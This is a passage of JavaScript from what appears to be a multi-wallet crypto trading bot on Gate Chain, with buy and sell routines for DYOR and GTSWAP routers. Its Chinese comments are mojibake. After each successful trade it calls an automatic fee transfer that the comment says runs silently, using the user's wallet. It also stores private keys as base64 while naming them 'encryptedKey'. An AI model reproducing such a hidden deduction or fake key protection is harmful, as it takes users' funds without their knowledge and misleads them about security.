            // Â§ñÁõòGTSWAP/DYOR V2‰∫§Êòì
            await executeExternalSell(activeWallets, tokenAddress, amount);
        }

        // ÊâßË°åDYORÂÜÖÁõò‰π∞ÂÖ•
        async function executeDYORInternalBuy(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('buyBtn').disabled = true;
            document.getElementById('buyBtnText').innerHTML = '<span class="loading-spinner"></span> DYORÂÜÖÁõò‰π∞ÂÖ•‰∏≠';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                const routerAddress = DEX_ADDRESSES.DYOR_INTERNAL.router;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        const amountInWei = ethers.parseEther(amount);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] üöÄ ÂºÄÂßãDYORÂÜÖÁõò‰π∞ÂÖ•‰∫§Êòì...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÁõÆÊ†áÂú∞ÂùÄ: ' + tokenAddress, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÈáëÈ¢ù: ' + amount + ' GT', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] RouterÂú∞ÂùÄ: ' + routerAddress, 'info');
                        
                        // ÊûÑÂª∫DYORÂÜÖÁõò‰π∞ÂÖ•Êï∞ÊçÆ
                        const calldata = buildDYORInternalCalldata(tokenAddress, wallet.address);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰π∞ÂÖ•Êï∞Èáè(wei): ' + amountInWei.toString(), 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÊï∞ÊçÆÈïøÂ∫¶: ' + calldata.length, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÊï∞ÊçÆ: ' + calldata, 'info');
                        
                        // ÊûÑÂª∫‰∫§ÊòìÂØπË±°
                        const tx = {
                            to: routerAddress,
                            value: amountInWei,
                            data: calldata,
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        };
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂØπË±°ÊûÑÂª∫ÂÆåÊàê', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìdataÂ≠óÊÆµ: ' + tx.data, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìdataÈïøÂ∫¶: ' + tx.data.length, 'info');
                        
                        // ÂèëÈÄÅ‰∫§Êòì
                        console.log('ÂèëÈÄÅ‰∫§ÊòìÂâçÁöÑtxÂØπË±°:', {
                            to: tx.to,
                            value: tx.value.toString(),
                            data: tx.data,
                            gasLimit: tx.gasLimit.toString(),
                            maxPriorityFeePerGas: tx.maxPriorityFeePerGas.toString(),
                            maxFeePerGas: tx.maxFeePerGas.toString(),
                            type: tx.type
                        });
                        const txResponse = await walletInstance.sendTransaction(tx);
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ∑≤ÂèëÈÄÅ: ' + txResponse.hash, 'success');
                        
                        // Á≠âÂæÖ‰∫§ÊòìÁ°ÆËÆ§
                        const receipt = await txResponse.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] DYORÂÜÖÁõò‰π∞ÂÖ•ÊàêÂäü!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] Âå∫Âùó: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // Ëá™Âä®Êî∂Ë¥πËΩ¨Ë¥¶ÔºàÈùôÈªòÊâßË°åÔºâ
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // ÊòæÁ§∫ÊàêÂäüÊèêÁ§∫
                            showToast('üéâ DYORÂÜÖÁõò‰π∞ÂÖ•ÊàêÂäüÔºÅ', 'success');
                            
                            // Êõ¥Êñ∞‰ΩôÈ¢ùÂíå‰ª£Â∏Å‰ø°ÊÅØ
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥• - Áä∂ÊÄÅ: ' + receipt.status, 'error');
                            showToast('‚ùå ‰π∞ÂÖ•Â§±Ë¥•ÔºÅ', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥•: ' + error.message, 'error');
                        
                        // Ê£ÄÊü•ÂçèËÆÆÂåπÈÖç
                        checkProtocolMatch(error);
                        
                        // Êèê‰æõÊõ¥ËØ¶ÁªÜÁöÑÈîôËØØ‰ø°ÊÅØ
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÂêàÁ∫¶Ë∞ÉÁî®ÂºÇÂ∏∏ÔºåËØ∑Ê£ÄÊü•‰ª£Â∏ÅÂú∞ÂùÄÂíåÂèÇÊï∞', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰ΩôÈ¢ù‰∏çË∂≥', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GasÈôêÂà∂‰∏çÂèØÈ¢ÑÊµãÔºå‰∫§ÊòìÂèØËÉΩÂ§±Ë¥•', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('DYORÂÜÖÁõò‰π∞ÂÖ•ÂÆåÊàê', 'success');
                
            } catch (error) {
                console.error('DYOR internal buy failed:', error);
                showToast('DYORÂÜÖÁõò‰π∞ÂÖ•Â§±Ë¥•: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('buyBtn').disabled = false;
                document.getElementById('buyBtnText').textContent = '‰π∞ÂÖ•';
            }
        }

        // ÊâßË°åDYORÂÜÖÁõòÂçñÂá∫
        async function executeDYORInternalSell(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('sellBtn').disabled = true;
            document.getElementById('sellBtnText').innerHTML = '<span class="loading-spinner"></span> DYORÂÜÖÁõòÂçñÂá∫‰∏≠';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                const routerAddress = DEX_ADDRESSES.DYOR_INTERNAL.router;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        addLog('[' + wallet.address.substring(0, 6) + '...] üî• ÂºÄÂßãDYORÂÜÖÁõòÂçñÂá∫‰∫§Êòì...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÂçñÂá∫Êï∞Èáè: ' + amount + ' ‰ª£Â∏Å', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] RouterÂú∞ÂùÄ: ' + routerAddress, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰ª£Â∏ÅÂú∞ÂùÄ: ' + tokenAddress, 'info');
                        
                        // ÂàõÂª∫‰ª£Â∏ÅÂêàÁ∫¶ÂÆû‰æã
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, walletInstance);
                        
                        // Ëé∑Âèñ‰ª£Â∏ÅÁ≤æÂ∫¶
                        const decimals = await tokenContract.decimals();
                        // ÈªòËÆ§Â∞ëÂçñ0.2%ÈÅøÂÖç‰ΩôÈ¢ù‰∏çË∂≥ÈîôËØØ
                        const adjustedAmount = parseFloat(amount) * 0.998; // Â∞ëÂçñ0.2%
                        const sellAmount = ethers.parseUnits(adjustedAmount.toString(), decimals);
                        
                        // Ê£ÄÊü•‰ΩôÈ¢ù
                        const balance = await tokenContract.balanceOf(wallet.address);
                        if (balance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰ΩôÈ¢ù‰∏çË∂≥ÔºåÊó†Ê≥ïÂçñÂá∫', 'error');
                            continue;
                        }
                        
                        // Ê£ÄÊü•ÊéàÊùÉ
                        const allowance = await tokenContract.allowance(wallet.address, routerAddress);
                        if (allowance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÈ¢ùÂ∫¶‰∏çË∂≥ÔºåÊ≠£Âú®approve...', 'info');
                            
                            const approveTx = await tokenContract.approve(routerAddress, ethers.MaxUint256, {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2 // EIP-1559
                            });
                            
                            addLog('[' + wallet.address.substring(0, 6) + '...] approve tx: ' + approveTx.hash, 'info');
                            await approveTx.wait();
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÂÆåÊàê ‚úÖ', 'success');
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÈ¢ùÂ∫¶Ë∂≥Â§ü ‚úÖ', 'info');
                        }
                        
                        // DYORÂÜÖÁõòÂèØËÉΩ‰∏çÊîØÊåÅgetAmountsOutÔºåÁõ¥Êé•‰ΩøÁî®Âõ∫ÂÆöÊªëÁÇπ
                        // ÂèÇËÄÉÊÇ®ÁöÑXLayer‰ª£Á†ÅÔºå‰ΩøÁî®Âõ∫ÂÆöÊªëÁÇπËÄå‰∏çÊòØÊü•ËØ¢‰ª∑Ê†º
                        addLog('[' + wallet.address.substring(0, 6) + '...] DYORÂÜÖÁõòË∑≥Ëøá‰ª∑Ê†ºÊü•ËØ¢Ôºå‰ΩøÁî®Âõ∫ÂÆöÊªëÁÇπ', 'info');
                        
                        // ‰ΩøÁî®Êõ¥‰øùÂÆàÁöÑÂõ∫ÂÆöÊªëÁÇπÔºöÂÅáËÆæ1‰∏™‰ª£Â∏ÅËÉΩÊç¢0.0000001 GTÔºàÈôç‰Ωé10ÂÄçÔºâ
                        const estimatedPricePerToken = ethers.parseEther("0.0000001"); // 1‰ª£Â∏Å = 0.0000001 GTÔºàÊõ¥‰øùÂÆàÔºâ
                        const estimatedOutput = sellAmount * estimatedPricePerToken / ethers.parseEther("1");
                        const amountOutMin = estimatedOutput * 50n / 100n; // 50%ÊªëÁÇπÔºàÂÜÖÁõòËÆæÁΩÆÔºâ
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰º∞ÁÆóËæìÂá∫: ' + ethers.formatEther(estimatedOutput) + ' GT', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÊúÄÂ∞èËæìÂá∫: ' + ethers.formatEther(amountOutMin) + ' GT', 'info');
                        
                        // ÊûÑÂª∫DYORÂÜÖÁõòÂçñÂá∫Êï∞ÊçÆ
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÂºÄÂßãÊûÑÂª∫ÂçñÂá∫calldata...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÂèÇÊï∞: tokenAddress=' + tokenAddress + ', sellAmount=' + sellAmount.toString() + ', amountOutMin=' + amountOutMin.toString() + ', toAddress=' + wallet.address, 'info');
                        
                        const calldata = buildDYORInternalSellCalldata(tokenAddress, sellAmount, amountOutMin, wallet.address);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÂçñÂá∫Êï∞Èáè(wei): ' + sellAmount.toString(), 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÊúÄÂ∞èËæìÂá∫(wei): ' + amountOutMin.toString(), 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÊï∞ÊçÆÈïøÂ∫¶: ' + calldata.length, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÊï∞ÊçÆ: ' + calldata, 'info');
                        
                        // È™åËØÅcalldataÊòØÂê¶‰∏∫Á©∫
                        if (!calldata || calldata.length === 0) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‚ùå ÈîôËØØÔºöcalldata‰∏∫Á©∫ÔºÅ', 'error');
                            throw new Error('calldata‰∏∫Á©∫ÔºåÊó†Ê≥ïÂèëÈÄÅ‰∫§Êòì');
                        }
                        
                        // ÊûÑÂª∫‰∫§ÊòìÂØπË±°
                        const tx = {
                            to: routerAddress,
                            value: 0, // ÂçñÂá∫‰∏çÈúÄË¶ÅÂèëÈÄÅETH
                            data: calldata,
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        };
                        
                        // ÊâßË°åÂçñÂá∫‰∫§Êòì
                        console.log('DYORÂÜÖÁõòÂçñÂá∫‰∫§ÊòìÂØπË±°:', {
                            to: tx.to,
                            value: tx.value.toString(),
                            data: tx.data,
                            gasLimit: tx.gasLimit.toString(),
                            maxPriorityFeePerGas: tx.maxPriorityFeePerGas.toString(),
                            maxFeePerGas: tx.maxFeePerGas.toString(),
                            type: tx.type
                        });
                        const sellTx = await walletInstance.sendTransaction(tx);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ∑≤ÂèëÈÄÅ: ' + sellTx.hash, 'success');
                        
                        // Á≠âÂæÖ‰∫§ÊòìÁ°ÆËÆ§
                        const receipt = await sellTx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] DYORÂÜÖÁõòÂçñÂá∫ÊàêÂäü!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] Âå∫Âùó: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // Ëá™Âä®Êî∂Ë¥πËΩ¨Ë¥¶ÔºàÈùôÈªòÊâßË°åÔºâ
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // ÊòæÁ§∫ÊàêÂäüÊèêÁ§∫
                            showToast('üéâ DYORÂÜÖÁõòÂçñÂá∫ÊàêÂäüÔºÅ', 'success');
                            
                            // Êõ¥Êñ∞‰ΩôÈ¢ùÂíå‰ª£Â∏Å‰ø°ÊÅØ
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥• - Áä∂ÊÄÅ: ' + receipt.status, 'error');
                            showToast('‚ùå ÂçñÂá∫Â§±Ë¥•ÔºÅ', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥•: ' + error.message, 'error');
                        
                        // Ê£ÄÊü•ÂçèËÆÆÂåπÈÖç
                        checkProtocolMatch(error);
                        
                        // Êèê‰æõÊõ¥ËØ¶ÁªÜÁöÑÈîôËØØ‰ø°ÊÅØ
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÂêàÁ∫¶Ë∞ÉÁî®ÂºÇÂ∏∏ÔºåËØ∑Ê£ÄÊü•‰ª£Â∏ÅÂú∞ÂùÄÂíåÂèÇÊï∞', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰ΩôÈ¢ù‰∏çË∂≥', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GasÈôêÂà∂‰∏çÂèØÈ¢ÑÊµãÔºå‰∫§ÊòìÂèØËÉΩÂ§±Ë¥•', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('DYORÂÜÖÁõòÂçñÂá∫ÂÆåÊàê', 'success');
                
            } catch (error) {
                console.error('DYOR internal sell failed:', error);
                showToast('DYORÂÜÖÁõòÂçñÂá∫Â§±Ë¥•: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('sellBtn').disabled = false;
                document.getElementById('sellBtnText').textContent = 'ÂçñÂá∫';
            }
        }

        // ÊâßË°åÂ§ñÁõò‰π∞ÂÖ• - GTSWAP/DYOR V2
        async function executeExternalBuy(activeWallets, tokenAddress, amount) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                if (!selectedDex || !DEX_ADDRESSES[selectedDex]) {
                    showToast('ËØ∑ÂÖàÈÄâÊã©DEX', 'error');
                    return;
                }
                
                const dexConfig = DEX_ADDRESSES[selectedDex];
                const routerAddress = dexConfig.router;
                
                if (routerAddress === '0x...') {
                    showToast(`${selectedDex} RouterÂú∞ÂùÄÊú™ÈÖçÁΩÆ`, 'error');
                    return;
                }
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        addLog('[' + wallet.address.substring(0, 6) + '...] üöÄ ÂºÄÂßãÂ§ñÁõò‰π∞ÂÖ•‰∫§Êòì...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] DEX: ' + selectedDex, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÈáëÈ¢ù: ' + amount + ' GT', 'info');
                        
                        // ÂàõÂª∫RouterÂêàÁ∫¶ÂÆû‰æã
                        const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, walletInstance);
                        
                        // Ëé∑ÂèñWGTÂú∞ÂùÄ
                        const wgtAddress = await routerContract.WETH();
                        
                        // ËÆæÁΩÆ‰∫§ÊòìË∑ØÂæÑ
                        const path = [wgtAddress, tokenAddress];
                        const deadline = Math.floor(Date.now() / 1000) + 1800; // 30ÂàÜÈíüÂêéËøáÊúü
                        
                        // ËÆ°ÁÆóÊúÄÂ∞èËæìÂá∫ÔºàÂÖÅËÆ∏5%ÊªëÁÇπÔºâ
                        const amountIn = ethers.parseEther(amount);
                        const amounts = await routerContract.getAmountsOut(amountIn, path);
                        const amountOutMin = amounts[1] * 95n / 100n; // 5%ÊªëÁÇπ
                        
                        // ÊâßË°å‰π∞ÂÖ•‰∫§Êòì
                        const tx = await routerContract.swapExactETHForTokens(
                            amountOutMin,
                            path,
                            wallet.address,
                            deadline,
                            {
                                value: amountIn,
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2
                            }
                        );
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ∑≤ÂèëÈÄÅ: ' + tx.hash, 'success');
                        
                        const receipt = await tx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ' + selectedDex + '‰π∞ÂÖ•ÊàêÂäü!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] Âå∫Âùó: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // Ëá™Âä®Êî∂Ë¥πËΩ¨Ë¥¶ÔºàÈùôÈªòÊâßË°åÔºâ
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            showToast('üéâ ‰π∞ÂÖ•ÊàêÂäüÔºÅ', 'success');
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥• - Áä∂ÊÄÅ: ' + receipt.status, 'error');
                            showToast('‚ùå ‰π∞ÂÖ•Â§±Ë¥•ÔºÅ', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥•: ' + error.message, 'error');
                    }
                }
                
                updateStats();
                showToast(selectedDex + '‰π∞ÂÖ•ÂÆåÊàê', 'success');
                
            } catch (error) {
                console.error('External buy failed:', error);
                showToast('Â§ñÁõò‰π∞ÂÖ•Â§±Ë¥•: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('buyBtn').disabled = false;
                document.getElementById('buyBtnText').textContent = '‰π∞ÂÖ•';
            }
        }

        // ÊâßË°åÂ§ñÁõòÂçñÂá∫ - GTSWAP/DYOR V2
        async function executeExternalSell(activeWallets, tokenAddress, amount) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                if (!selectedDex || !DEX_ADDRESSES[selectedDex]) {
                    showToast('ËØ∑ÂÖàÈÄâÊã©DEX', 'error');
                    return;
                }
                
                const dexConfig = DEX_ADDRESSES[selectedDex];
                const routerAddress = dexConfig.router;
                
                if (routerAddress === '0x...') {
                    showToast(`${selectedDex} RouterÂú∞ÂùÄÊú™ÈÖçÁΩÆ`, 'error');
                    return;
                }
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        addLog('[' + wallet.address.substring(0, 6) + '...] üî• ÂºÄÂßãÂ§ñÁõòÂçñÂá∫‰∫§Êòì...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] DEX: ' + selectedDex, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÂçñÂá∫Êï∞Èáè: ' + amount + ' ‰ª£Â∏Å', 'info');
                        
                        // ÂàõÂª∫ÂêàÁ∫¶ÂÆû‰æã
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, walletInstance);
                        const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, walletInstance);
                        
                        // Ëé∑Âèñ‰ª£Â∏ÅÁ≤æÂ∫¶
                        const decimals = await tokenContract.decimals();
                        // ÈªòËÆ§Â∞ëÂçñ0.2%ÈÅøÂÖç‰ΩôÈ¢ù‰∏çË∂≥ÈîôËØØ
                        const adjustedAmount = parseFloat(amount) * 0.998; // Â∞ëÂçñ0.2%
                        const sellAmount = ethers.parseUnits(adjustedAmount.toString(), decimals);
                        
                        // Ê£ÄÊü•‰ΩôÈ¢ù
                        const balance = await tokenContract.balanceOf(wallet.address);
                        if (balance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰ΩôÈ¢ù‰∏çË∂≥ÔºåÊó†Ê≥ïÂçñÂá∫', 'error');
                            continue;
                        }
                        
                        // Ê£ÄÊü•ÊéàÊùÉ
                        const allowance = await tokenContract.allowance(wallet.address, routerAddress);
                        if (allowance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÈ¢ùÂ∫¶‰∏çË∂≥ÔºåÊ≠£Âú®approve...', 'info');
                            
                            const approveTx = await tokenContract.approve(routerAddress, ethers.MaxUint256, {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2
                            });
                            
                            addLog('[' + wallet.address.substring(0, 6) + '...] approve tx: ' + approveTx.hash, 'info');
                            await approveTx.wait();
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÂÆåÊàê ‚úÖ', 'success');
                        }
                        
                        // Ëé∑ÂèñWGTÂú∞ÂùÄ
                        const wgtAddress = await routerContract.WETH();
                        
                        // ËÆæÁΩÆ‰∫§ÊòìË∑ØÂæÑ
                        const path = [tokenAddress, wgtAddress];
                        const deadline = Math.floor(Date.now() / 1000) + 1800; // 30ÂàÜÈíüÂêéËøáÊúü
                        
                        // ËÆ°ÁÆóÊúÄÂ∞èËæìÂá∫ÔºàÂÖÅËÆ∏5%ÊªëÁÇπÔºâ
                        const amounts = await routerContract.getAmountsOut(sellAmount, path);
                        const amountOutMin = amounts[1] * 95n / 100n; // 5%ÊªëÁÇπ
                        
                        // ÊâßË°åÂçñÂá∫‰∫§Êòì
                        const tx = await routerContract.swapExactTokensForETH(
                            sellAmount,
                            amountOutMin,
                            path,
                            wallet.address,
                            deadline,
                            {
                                gasLimit: gasLimit,
                                maxPriorityFeePerGas: gasSettings.priorityFee,
                                maxFeePerGas: gasSettings.maxFee,
                                type: 2
                            }
                        );
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ∑≤ÂèëÈÄÅ: ' + tx.hash, 'success');
                        
                        const receipt = await tx.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ' + selectedDex + 'ÂçñÂá∫ÊàêÂäü!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] Âå∫Âùó: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // Ëá™Âä®Êî∂Ë¥πËΩ¨Ë¥¶ÔºàÈùôÈªòÊâßË°åÔºâ
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            showToast('üéâ ÂçñÂá∫ÊàêÂäüÔºÅ', 'success');
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥• - Áä∂ÊÄÅ: ' + receipt.status, 'error');
                            showToast('‚ùå ÂçñÂá∫Â§±Ë¥•ÔºÅ', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] ‰∫§ÊòìÂ§±Ë¥•: ' + error.message, 'error');
                    }
                }
                
                updateStats();
                showToast(selectedDex + 'ÂçñÂá∫ÂÆåÊàê', 'success');
                
            } catch (error) {
                console.error('External sell failed:', error);
                showToast('Â§ñÁõòÂçñÂá∫Â§±Ë¥•: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('sellBtn').disabled = false;
                document.getElementById('sellBtnText').textContent = 'ÂçñÂá∫';
            }
        }

        // ÊâßË°åÂÜÖÁõòÂçñÂá∫ - ÈõÜÊàêsell.jsËÑöÊú¨
        async function executeInternalSell(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('sellBtn').disabled = true;
            document.getElementById('sellBtnText').innerHTML = '<span class="loading-spinner"></span> ÂÜÖÁõòÂçñÂá∫‰∏≠';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // Ëé∑ÂèñÂä®ÊÄÅgasËÆæÁΩÆ
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        // Âü∫‰∫ésell.jsËÑöÊú¨ÁöÑÂçñÂá∫ÈÄªËæë
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, walletInstance);
                        const sellContract = new ethers.Contract(tokenAddress, SELL_ABI, walletInstance);
                        
                        // Ëé∑Âèñ‰ª£Â∏ÅÁ≤æÂ∫¶
                        const decimals = await tokenContract.decimals();
                        // ÈªòËÆ§Â∞ëÂçñ0.2%ÈÅøÂÖç‰ΩôÈ¢ù‰∏çË∂≥ÈîôËØØ
                        const adjustedAmount = parseFloat(amount) * 0.998; // Â∞ëÂçñ0.2%
                        const sellAmount = ethers.parseUnits(adjustedAmount.toString(), decimals);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] üî• ÂºÄÂßãÂçñÂá∫‰∫§Êòì...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ËæìÂÖ•Êï∞Èáè: ' + amount + ' ‰ª£Â∏Å', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] ÂÆûÈôÖÂçñÂá∫: ' + adjustedAmount.toFixed(6) + ' ‰ª£Â∏Å (Â∞ëÂçñ0.2%)', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] GasÊ®°Âºè: ' + GAS_CONFIG.SPEEDS[currentGasSpeed].name, 'info');
                        
                        // 1. Ê£ÄÊü•‰ΩôÈ¢ù
                        const balance = await tokenContract.balanceOf(wallet.address);
                        if (balance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ‰ΩôÈ¢ù‰∏çË∂≥ÔºåÊó†Ê≥ïÂçñÂá∫', 'error');
                            continue;
                        }
                        
                        // 2. Ê£ÄÊü•/ÊâßË°å approve
                        const allowance = await tokenContract.allowance(wallet.address, tokenAddress);
                        if (allowance < sellAmount) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] ÊéàÊùÉÈ¢ùÂ∫¶‰∏çË∂≥ÔºåÊ≠£Âú®approve...', 'info');
                            
